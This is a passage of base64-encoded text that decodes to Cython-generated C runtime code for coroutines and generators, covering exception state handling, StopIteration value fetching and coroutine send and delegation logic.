9IGVsc2UgewogICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgZXhjID0gdmFsdWU7CiAgICB9CiAgICAjaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIGlmICghX19weXhfdHN0YXRlLT5leGNfaW5mby0+ZXhjX3ZhbHVlKQogICAgI2Vsc2UKICAgIGlmICghX19weXhfdHN0YXRlLT5leGNfdHlwZSkKICAgICNlbmRpZgogICAgewogICAgICAgIFB5X0lOQ1JFRihleGNfdHlwZSk7CiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShleGNfdHlwZSwgZXhjLCBOVUxMKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICAjZW5kaWYKI2Vsc2UKICAgIGV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZXhjX3R5cGUsIHZhbHVlKTsKICAgIGlmICh1bmxpa2VseSghZXhjKSkgcmV0dXJuOwojZW5kaWYKICAgIFB5RXJyX1NldE9iamVjdChleGNfdHlwZSwgZXhjKTsKICAgIFB5X0RFQ1JFRihleGMpOwp9CgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNpbmNsdWRlIDxmcmFtZW9iamVjdC5oPgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDBhNiAmJiAhZGVmaW5lZChQWVBZX1ZFUlNJT04pCiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFCiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMQogICNlbmRpZgogICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCIKI2VuZGlmCiNlbmRpZiAvLyBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQKX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKI2lmIENZVEhPTl9VU0VfQU1fU0VORAogICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7CiNlbmRpZgogICAgUHlfQ0xFQVIoZ2VuLT55aWVsZGZyb20pOwp9CnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpIHsKICAgIFB5T2JqZWN0ICpldCwgKmV2LCAqdGI7CiAgICBQeU9iamVjdCAqdmFsdWUgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfdHN0YXRlKTsKICAgIF9fUHl4X0VyckZldGNoKCZldCwgJmV2LCAmdGIpOwogICAgaWYgKCFldCkgewogICAgICAgIFB5X1hERUNSRUYodGIpOwogICAgICAgIFB5X1hERUNSRUYoZXYpOwogICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICAqcHZhbHVlID0gUHlfTm9uZTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIGlmIChsaWtlbHkoZXQgPT0gUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHsKICAgICAgICBpZiAoIWV2KSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICAgICAgdmFsdWUgPSBQeV9Ob25lOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmIChsaWtlbHkoX19QeXhfSVNfVFlQRShldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgICAgICAgICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlOwogICAgICAgICAgICAjZWxzZQogICAgICAgICAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTsKICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIFB5X0RFQ1JFRihldik7CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYgKHVubGlrZWx5KFB5VHVwbGVfQ2hlY2soZXYpKSkgewogICAgICAgICAgICBQeV9zc2l6ZV90IHR1cGxlX3NpemUgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGV2KTsKICAgICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgICBpZiAodW5saWtlbHkodHVwbGVfc2l6ZSA8IDApKSB7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRiKTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldik7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXQpOwogICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICB9CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICBpZiAodHVwbGVfc2l6ZSA+PSAxKSB7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICAgICAgdmFsdWUgPSBQeVR1cGxlX0dFVF9JVEVNKGV2LCAwKTsKICAgICAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9JVEVNKGV2LCAwKTsKI2Vsc2UKICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGV2LCAwKTsKICAgICAgICAgICAgICAgIGlmICghdmFsdWUpIGdvdG8gbGltaXRlZF9hcGlfZmFpbHVyZTsKI2VuZGlmCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeV9JTkNSRUYoUHlfTm9uZSk7CiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUHlfREVDUkVGKGV2KTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAoIV9fUHl4X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHsKICAgICAgICAgICAgdmFsdWUgPSBldjsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseSh2YWx1ZSkpIHsKICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihldCk7CiAgICAgICAgICAgICpwdmFsdWUgPSB2YWx1ZTsKICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgfQogICAgfSBlbHNlIGlmICghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkgewogICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZldCwgJmV2LCAmdGIpOwogICAgaWYgKHVubGlrZWx5KCFQeU9iamVjdF9UeXBlQ2hlY2soZXYsIChQeVR5cGVPYmplY3QqKVB5RXhjX1N0b3BJdGVyYXRpb24pKSkgewogICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfWERFQ1JFRih0Yik7CiAgICBQeV9ERUNSRUYoZXQpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpOwojZWxzZQogICAgdmFsdWUgPSAoKFB5U3RvcEl0ZXJhdGlvbk9iamVjdCAqKWV2KS0+dmFsdWU7CiAgICBQeV9JTkNSRUYodmFsdWUpOwojZW5kaWYKICAgIFB5X0RFQ1JFRihldik7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgcmV0dXJuIC0xOwojZW5kaWYKICAgICpwdmFsdWUgPSB2YWx1ZTsKICAgIHJldHVybiAwOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgbGltaXRlZF9hcGlfZmFpbHVyZToKICAgIFB5X1hERUNSRUYoZXQpOwogICAgUHlfWERFQ1JFRih0Yik7CiAgICBQeV9YREVDUkVGKGV2KTsKICAgIHJldHVybiAtMTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUKX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9zdGF0dXNfZnJvbV9yZXN1bHQoUHlPYmplY3QgKipyZXR2YWwpIHsKICAgIGlmICgqcmV0dmFsKSB7CiAgICAgICAgcmV0dXJuIFBZR0VOX05FWFQ7CiAgICB9IGVsc2UgaWYgKGxpa2VseShfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCByZXR2YWwpID09IDApKSB7CiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjsKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQp9CnN0YXRpYyBDWVRIT05fSU5MSU5FCnZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSkgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgUHlfQ0xFQVIoZXhjX3N0YXRlLT5leGNfdmFsdWUpOwojZWxzZQogICAgUHlPYmplY3QgKnQsICp2LCAqdGI7CiAgICB0ID0gZXhjX3N0YXRlLT5leGNfdHlwZTsKICAgIHYgPSBleGNfc3RhdGUtPmV4Y192YWx1ZTsKICAgIHRiID0gZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrOwogICAgZXhjX3N0YXRlLT5leGNfdHlwZSA9IE5VTEw7CiAgICBleGNfc3RhdGUtPmV4Y192YWx1ZSA9IE5VTEw7CiAgICBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2sgPSBOVUxMOwogICAgUHlfWERFQ1JFRih0KTsKICAgIFB5X1hERUNSRUYodik7CiAgICBQeV9YREVDUkVGKHRiKTsKI2VuZGlmCn0KI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pICAoX19QeXhfX0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbiksIChQeU9iamVjdCopTlVMTCkKc3RhdGljIHZvaWQgX19QeXhfX0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7CiAgICBjb25zdCBjaGFyICptc2c7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihnZW4pOwogICAgaWYgKCgwKSkgewogICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICB9IGVsc2UgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVjaygoUHlPYmplY3QqKWdlbikpIHsKICAgICAgICBtc2cgPSAiY29yb3V0aW5lIGFscmVhZHkgZXhlY3V0aW5nIjsKICAgICNlbmRpZgogICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgIH0gZWxzZSBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdCgoUHlPYmplY3QqKWdlbikpIHsKICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjsKICAgICNlbmRpZgogICAgfSBlbHNlIHsKICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjsKICAgIH0KICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19WYWx1ZUVycm9yLCBtc2cpOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5VGVybWluYXRlZEVycm9yKFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICp2YWx1ZSwgaW50IGNsb3NpbmcpIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGdlbik7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihjbG9zaW5nKTsKICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgaWYgKCFjbG9zaW5nICYmIF9fUHl4X0Nvcm91dGluZV9DaGVjayhnZW4pKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgImNhbm5vdCByZXVzZSBhbHJlYWR5IGF3YWl0ZWQgY29yb3V0aW5lIik7CiAgICB9IGVsc2UKICAgICNlbmRpZgogICAgaWYgKHZhbHVlKSB7CiAgICAgICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgICAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pKQogICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7CiAgICAgICAgZWxzZQogICAgICAgICNlbmRpZgogICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7CiAgICB9Cn0Kc3RhdGljCl9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCwgaW50IGNsb3NpbmcpIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlOwogICAgX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlOwogICAgUHlPYmplY3QgKnJldHZhbDsKICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoc2VsZikpOyAgLy8gQ2FsbGVycyBzaG91bGQgZW5zdXJlIGlzX3J1bm5pbmcKICAgIGlmICh1bmxpa2VseShzZWxmLT5yZXN1bWVfbGFiZWwgPT0gLTEpKSB7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlUZXJtaW5hdGVkRXJyb3IoKFB5T2JqZWN0KilzZWxmLCB2YWx1ZSwgY2xvc2luZyk7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgdHN0YXRlID0gX19weXhfdHN0YXRlOwojZWxzZQogICAgdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50OwojZW5kaWYKICAgIGV4Y19zdGF0ZSA9ICZzZWxmLT5naV9leGNfc3RhdGU7CiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdmFsdWUpIHsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgICAgICAjZWxzZQogICAgICAgIFB5T2JqZWN0ICpleGNfdGI7CiAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGV4Y190YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiAgICAgICAgI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgICAgIGV4Y190YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgZXhjX3N0YXRlLT5leGNfdmFsdWUpLT50cmFjZWJhY2s7CiAgICAgICAgI2Vsc2UKICAgICAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKGV4Y190YikgewogICAgICAgICAgICBQeVRyYWNlYmFja09iamVjdCAqdGIgPSAoUHlUcmFjZWJhY2tPYmplY3QgKikgZXhjX3RiOwogICAgICAgICAgICBQeUZyYW1lT2JqZWN0ICpmID0gdGItPnRiX2ZyYW1lOwogICAgICAgICAgICBhc3NlcnQoZi0+Zl9iYWNrID09IE5VTEwpOwogICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMQogICAgICAgICAgICBmLT5mX2JhY2sgPSBQeVRocmVhZFN0YXRlX0dldEZyYW1lKHRzdGF0ZSk7CiAgICAgICAgICAgICNlbHNlCiAgICAgICAgICAgIFB5X1hJTkNSRUYodHN0YXRlLT5mcmFtZSk7CiAgICAgICAgICAgIGYtPmZfYmFjayA9IHRzdGF0ZS0+ZnJhbWU7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgICAgIFB5X0RFQ1JFRihleGNfdGIpOwogICAgICAgICAgICAjZW5kaWYKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICB9CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZTsKI2Vsc2UKICAgIGlmIChleGNfc3RhdGUtPmV4Y190eXBlKSB7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmZXhjX3N0YXRlLT5leGNfdHlwZSwgJmV4Y19zdGF0ZS0+ZXhjX3ZhbHVlLCAmZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrKTsKICAgIH0gZWxzZSB7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKGV4Y19zdGF0ZSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmZXhjX3N0YXRlLT5leGNfdHlwZSwgJmV4Y19zdGF0ZS0+ZXhjX3ZhbHVlLCAmZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrKTsKICAgIH0KI2VuZGlmCiAgICByZXR2YWwgPSBzZWxmLT5ib2R5KHNlbGYsIHRzdGF0ZSwgdmFsdWUpOwojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTsKICAgIHRzdGF0ZS0+ZXhjX2luZm8gPSBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW07CiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSBOVUxMOwogICAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0RnJhbWVCYWNrcG9pbnRlcihleGNfc3RhdGUpOwojZW5kaWYKICAgICpyZXN1bHQgPSByZXR2YWw7CiAgICBpZiAoc2VsZi0+cmVzdW1lX2xhYmVsID09IC0xKSB7CiAgICAgICAgcmV0dXJuIGxpa2VseShyZXR2YWwpID8gUFlHRU5fUkVUVVJOIDogUFlHRU5fRVJST1I7CiAgICB9CiAgICByZXR1cm4gUFlHRU5fTkVYVDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgQ1lUSE9OX1VOVVNFRF9WQVIoZXhjX3N0YXRlKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICpleGNfdGI7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgaWYgKCFleGNfc3RhdGUtPmV4Y192YWx1ZSkgcmV0dXJuOwogICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTsKICAgICNlbHNlCiAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICAjZW5kaWYKICAgIGlmIChsaWtlbHkoZXhjX3RiKSkgewogICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7CiAgICAgICAgUHlGcmFtZU9iamVjdCAqZiA9IHRiLT50Yl9mcmFtZTsKICAgICAgICBQeV9DTEVBUihmLT5mX2JhY2spOwogICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICAgICAgUHlfREVDUkVGKGV4Y190Yik7CiAgICAgICAgI2VuZGlmCiAgICB9CiNlbmRpZgp9CiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoZ2VuLCByZXN1bHQsIHJldHZhbCwgaXRlcm5leHQpXAogICAgKChyZXN1bHQpID09IFBZR0VOX05FWFQgPyAocmV0dmFsKSA6IF9fUHl4X19Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChnZW4sIHJlc3VsdCwgcmV0dmFsLCBpdGVybmV4dCkpCnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X19Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChQeU9iamVjdCogZ2VuLCBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0LCBQeU9iamVjdCAqcmV0dmFsLCBpbnQgaXRlcm5leHQpIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGdlbik7CiAgICBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4pKSB7CiAgICAgICAgaW50IGlzX2FzeW5jID0gMDsKICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgICAgIGlzX2FzeW5jID0gX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pOwogICAgICAgICNlbmRpZgogICAgICAgIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKHJldHZhbCwgaXNfYXN5bmMsIGl0ZXJuZXh0KTsKICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICB9CiAgICByZXR1cm4gTlVMTDsKfQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FClB5T2JqZWN0ICpfX1B5eF9QeUdlbl9TZW5kKFB5R2VuT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmcpIHsKI2lmIFBZX1ZFUlNJT05fSEVYIDw9IDB4MDMwQTAwQTEKICAgIHJldHVybiBfUHlHZW5fU2VuZChnZW4sIGFyZyk7CiNlbHNlCiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgaWYgKFB5SXRlcl9TZW5kKChQeU9iamVjdCopZ2VuLCBhcmcgPyBhcmcgOiBQeV9Ob25lLCAmcmVzdWx0KSA9PSBQWUdFTl9SRVRVUk4pIHsKICAgICAgICBpZiAoUHlBc3luY0dlbl9DaGVja0V4YWN0KGdlbikpIHsKICAgICAgICAgICAgYXNzZXJ0KHJlc3VsdCA9PSBQeV9Ob25lKTsKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24pOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmIChyZXN1bHQgPT0gUHlfTm9uZSkgewogICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BJdGVyYXRpb24pOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDBBMQogICAgICAgICAgICBfUHlHZW5fU2V0U3RvcEl0ZXJhdGlvblZhbHVlKHJlc3VsdCk7CiNlbHNlCiAgICAgICAgICAgIGlmICghUHlUdXBsZV9DaGVjayhyZXN1bHQpICYmICFQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHJlc3VsdCkpIHsKICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKmV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlFeGNfU3RvcEl0ZXJhdGlvbiwgcmVzdWx0KTsKICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoZXhjICE9IE5VTEwpKSB7CiAgICAgICAgICAgICAgICAgICAgUHlFcnJfU2V0T2JqZWN0KFB5RXhjX1N0b3BJdGVyYXRpb24sIGV4Yyk7CiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGV4Yyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KI2VuZGlmCiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpOwogICAgICAgIHJlc3VsdCA9IE5VTEw7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgX19QeXhfUHlTZW5kUmVzdWx0Cl9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBQeU9iamVjdCoqIHJldHZhbCkgewogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMOwogICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTsKICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCAmdmFsKTsKICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWwsIHJldHZhbCwgMCk7CiAgICBQeV9YREVDUkVGKHZhbCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNpZiBDWVRIT05fVVNFX0FNX1NFTkQKc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdApfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBnZW5fYW1fc2VuZCwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkgewogICAgUHlPYmplY3QgKnJldCA9IE5VTEw7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgZGVsZWdhdGVfcmVzdWx0LCByZXN1bHQ7CiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpOwogICAgZGVsZWdhdGVfcmVzdWx0ID0gZ2VuX2FtX3NlbmQoZ2VuLT55aWVsZGZyb20sIHZhbHVlLCAmcmV0KTsKICAgIGlmIChkZWxlZ2F0ZV9yZXN1bHQgPT0gUFlHRU5fTkVYVCkgewogICAgICAgIGFzc2VydCAocmV0ICE9IE5VTEwpOwogICAgICAgICpyZXR2YWwgPSByZXQ7CiAgICAgICAgcmV0dXJuIFBZR0VOX05FWFQ7CiAgICB9CiAgICBhc3NlcnQgKGRlbGVnYXRlX3Jlc3VsdCAhPSBQWUdFTl9FUlJPUiB8fCByZXQgPT0gTlVMTCk7CiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pOwogICAgcmVzdWx0ID0gX19